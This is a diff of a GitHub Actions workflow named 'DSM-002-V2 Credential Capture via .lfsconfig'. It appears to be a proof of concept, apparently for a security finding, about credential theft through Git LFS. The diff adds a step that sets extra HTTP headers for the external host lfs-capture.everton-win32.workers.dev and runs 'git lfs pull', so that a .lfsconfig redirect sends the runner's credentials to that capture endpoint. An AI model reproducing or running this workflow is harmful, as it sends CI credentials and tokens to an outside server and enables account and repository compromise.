@@ -1,7 +1,7 @@
 name: DSM-002-V2 Credential Capture via .lfsconfig
 
 on:
-  workflow_dispatch:  # Trigger manually
+  workflow_dispatch:
   push:
     paths:
       - '.github/workflows/dsm002-v2-capture.yml'
@@ -26,15 +26,14 @@ jobs:
           echo "=== Git LFS effective endpoint ==="
           git lfs env 2>&1 | grep -i endpoint
 
-    - name: Trigger LFS credential capture
-      run: |
-        echo "=== Running git lfs pull (reads .lfsconfig, redirects to capture endpoint) ==="
-        # Inject custom headers via git config (the real attack vector)
-        git config --global --add "http.https://lfs-capture.everton-win32.workers.dev.extraHeader" "x-auth-token: cloudflare"
-        git config --global --add "http.https://lfs-capture.everton-win32.workers.dev.extraHeader" "x-source: github-actions"
-        git lfs pull 2>&1 || true
-        echo ""
-        echo "=== LFS pull completed — credentials would be captured at the redirect endpoint ==="
+      - name: Trigger LFS credential capture
+        run: |
+          echo "=== Running git lfs pull (reads .lfsconfig, redirects to capture endpoint) ==="
+          git config --global --add "http.https://lfs-capture.everton-win32.workers.dev.extraHeader" "x-auth-token: cloudflare"
+          git config --global --add "http.https://lfs-capture.everton-win32.workers.dev.extraHeader" "x-source: github-actions"
+          git lfs pull 2>&1 || true
+          echo ""
+          echo "=== LFS pull completed - credentials would be captured at the redirect endpoint ==="
 
       - name: Evidence summary
         run: |
